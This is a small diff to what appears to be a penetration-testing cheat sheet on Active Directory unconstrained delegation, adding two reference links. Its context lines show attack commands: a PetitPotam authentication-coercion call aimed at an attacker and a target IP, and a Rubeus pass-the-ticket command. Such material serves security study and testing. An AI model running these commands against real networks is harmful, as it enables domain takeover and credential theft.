@@ -117,3 +117,9 @@ python3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP
 # Extract the ticket
 .\Rubeus.exe asktgs /ticket:<ticket base64> /ptt
 ```
+
+
+## References
+
+* [Exploiting Unconstrained Delegation - Riccardo Ancarani - 28 APRIL 2019](https://www.riccardoancarani.it/exploiting-unconstrained-delegation/)
+* [Hunting in Active Directory: Unconstrained Delegation & Forests Trusts - Roberto Rodriguez - Nov 28, 2018](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)
